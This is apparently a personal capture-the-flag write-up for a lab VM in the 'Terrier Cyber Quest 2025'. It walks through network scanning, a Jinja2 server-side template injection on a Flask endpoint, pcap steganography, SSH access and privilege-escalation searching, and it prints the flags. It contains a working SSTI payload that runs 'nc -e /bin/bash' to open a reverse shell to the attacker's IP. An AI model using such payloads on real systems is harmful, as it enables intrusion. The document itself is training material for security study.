# Indian Army Terrier Cyber Quest 2025 – CTF Write-Up

<img width="975" height="534" alt="image" src="https://github.com/user-attachments/assets/40160c9e-1980-4eff-bf5a-eb86ab933b44" />

# Challenge Overview
 web exploitation, network Forensics, steganography, privilege escalation, binary analysis, etc...

#### Machine link 
````
Vmware   -->  https://ctfptf.s3.ap-south-1.amazonaws.com/CTF-VMware+(1).ova
Virtual box -->  https://ctfptf.s3.ap-south-1.amazonaws.com/CTF_VB.ova
````

<img width="890" height="328" alt="image" src="https://github.com/user-attachments/assets/a5922814-0fa1-4591-8931-dca51ee634c2" />

Make sure that both attacker machine(kali ) and CTF machine  is in same network either NAT or Bridge network

## 1. Reconnaissance
The first step in any CTF is gathering information.

 <img width="975" height="217" alt="image" src="https://github.com/user-attachments/assets/d5899655-a63d-4b82-8c63-c0481a92ba8f" />

### 1.1. Scanning the Target

Scan for all host in network 
<img width="975" height="253" alt="image" src="https://github.com/user-attachments/assets/9da53fbb-a801-4183-b959-1388c08141ad" />

````
nmap -sn  192.168.29.0/24
````

### 192.168.29.114  -->  Target machine IP

Identify all the Open Ports & Service running in our target machine
````
nmap -p- -sV 192.168.29.114
````
<img width="975" height="381" alt="image" src="https://github.com/user-attachments/assets/03a58002-e628-4c9e-a74f-af2e4eb3ad74" />


Findings:
Port 5000 – Web Application (Flask)
Port 22 – SSH (Authentication required)
Other ports closed

### 1.2 Initial Enumeration
Visited the web application at http://192.168.190.135:5000/ and observed:

Input fields vulnerable to Reflected XSS


<img width="975" height="300" alt="image" src="https://github.com/user-attachments/assets/e6f84339-b169-4867-970a-59b1761c04b4" />

Now check the subdomains 

gobuster dir -u http://192.168.29.114:5000 -w /usr/share/wordlists/dirb/common.txt


<img width="975" height="457" alt="image" src="https://github.com/user-attachments/assets/955fbc86-75a3-4284-a68b-400f9bbb8818" />

<img width="975" height="217" alt="image" src="https://github.com/user-attachments/assets/807be188-586d-4ce7-9963-93699ee98258" />



<img width="975" height="383" alt="image" src="https://github.com/user-attachments/assets/455880c4-cdd0-47c9-a91d-387a18cdb500" />


<img width="875" height="380" alt="image" src="https://github.com/user-attachments/assets/23a6b833-0664-4545-b989-e85ce5e433fe" />

URL parameters potentially injectable for Server-Side Template Injection (SSTI)



Then I search about the version & service running in this Werkzeug httpd 3.1.3 (Python 3.11.2)

CVE-2024-34069  https://nvd.nist.gov/vuln/detail/cve-2024-34069

 & CVE-2024-49767 related to this vulnerability 

https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection



<img width="848" height="463" alt="image" src="https://github.com/user-attachments/assets/018a8faf-a0a2-41f9-97d1-71cbaedc1921" />



<img width="897" height="333" alt="image" src="https://github.com/user-attachments/assets/d2cf3e95-a496-4638-9e3a-6be1f4a78a8d" />


Here, /page endpoint is vulnerable to SSTI (Server-Side Template Injection)

curl -sG --data-urlencode "name={{ cycler.__init__.__globals__['os'].popen('ls /home').read() }}" http://192.168.29.114:5000/page



 <img width="975" height="84" alt="image" src="https://github.com/user-attachments/assets/6d7a751c-3b29-4e66-be5f-e78095a06cff" />


curl -sG --data-urlencode "name={{ cycler.__init__.__globals__['os'].popen('nc -e /bin/bash 192.168.29.173 4444').read() }}" "http://192.168.29.114:5000/page"
 
<img width="975" height="57" alt="image" src="https://github.com/user-attachments/assets/68502492-cc7e-4244-b35e-1d58ee9714ae" />

nc -nlvp 4444





<img width="975" height="335" alt="image" src="https://github.com/user-attachments/assets/a4e30227-4592-405a-9da4-ebf9042efb4e" />





Flag 1:

<img width="975" height="369" alt="image" src="https://github.com/user-attachments/assets/9a185df7-261d-4d78-b927-3029ffa8c7b8" />




<img width="975" height="157" alt="image" src="https://github.com/user-attachments/assets/293fd2b0-3627-40d3-be68-c61164fafed8" />




<img width="273" height="816" alt="image" src="https://github.com/user-attachments/assets/813e5e54-1b02-4aa7-84d2-19b2eb039c90" />





<img width="975" height="127" alt="image" src="https://github.com/user-attachments/assets/fe6caa18-5622-40cd-b823-26578ffbcab4" />

Download this capture.pcapng file




<img width="975" height="454" alt="image" src="https://github.com/user-attachments/assets/16242442-25e2-40cc-bdae-18c5ea6d6b04" />

<img width="975" height="710" alt="image" src="https://github.com/user-attachments/assets/68447d62-be3d-46bb-8a6e-d710b7024821" />

Save that Container.png image


<img width="975" height="526" alt="image" src="https://github.com/user-attachments/assets/8da190b8-600a-4543-8861-7a1987d03db3" />

This is our image 

Now what to do with this image 

<img width="975" height="252" alt="image" src="https://github.com/user-attachments/assets/12e84576-b148-4666-8813-faea8bc9424a" />

Then look for ICMP packets

<img width="975" height="511" alt="image" src="https://github.com/user-attachments/assets/f454f70c-c358-489d-8d39-ba1d5aad1462" />



Inside ICMP packets there is text section

<img width="975" height="747" alt="image" src="https://github.com/user-attachments/assets/3ea5dc84-228c-4d80-b1b9-3b95105ecd25" />







Hidden text  
  22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4 

 <img width="975" height="323" alt="image" src="https://github.com/user-attachments/assets/847d12d4-f954-41d7-a405-c21d95710511" />


Base 62-->hex--> Ascii

Pass:H1dden_W0rlD_UnD3r_Bit

From the Hint  Look for any Media transferred inside — file might be hiding something using OpenStego

 <img width="975" height="594" alt="image" src="https://github.com/user-attachments/assets/55ff3b90-4812-4848-a033-6982e49b11a6" />

<img width="957" height="464" alt="image" src="https://github.com/user-attachments/assets/458425f1-b4f0-48e8-8bf2-dee72b4ab916" />

 

Second FLAG:		F!ow3r#92@tY8&Vk


As there are 3 user  this might be credentials of one of these 3 user and there is ssh port open also

flower
leaf
stem

 
<img width="975" height="445" alt="image" src="https://github.com/user-attachments/assets/c8bfea1c-a061-48f2-bc8f-b8495e14af31" />

 


 <img width="975" height="221" alt="image" src="https://github.com/user-attachments/assets/04eda37b-c031-4b00-a65c-d09280ab2d4c" />


 <img width="975" height="304" alt="image" src="https://github.com/user-attachments/assets/0116243a-ce58-49db-b240-05e6e5bd28a9" />


 <img width="975" height="294" alt="image" src="https://github.com/user-attachments/assets/8f4c623b-0908-4c3b-91f8-6eff601ece97" />

<img width="975" height="485" alt="image" src="https://github.com/user-attachments/assets/68a357a0-e715-4403-ad06-2128f7e4f368" />

3 Flag: Y0u_kn0w_i5_th15_RaC3



After this what to do next  don’t know 
So I search for all file which are read & write by user leaf
Then I search for all file which are owned by leaf, then all files whose group is leaf

                        find / -type f -group leaf 2>/dev/null

  <img width="803" height="598" alt="image" src="https://github.com/user-attachments/assets/4c75251a-64b2-4c8d-b9d1-e606f191157d" />


 <img width="633" height="264" alt="image" src="https://github.com/user-attachments/assets/24e74974-a6f0-48ca-949a-c9b31988cbf8" />


There I file challenge file in /usr/bin/challenge

 


 
<img width="633" height="264" alt="image" src="https://github.com/user-attachments/assets/4976c289-195d-42a8-8021-58d1ca8b6726" />

<img width="844" height="590" alt="image" src="https://github.com/user-attachments/assets/8798179c-6632-43ca-8d8d-ddb0acaa7f5f" />







































































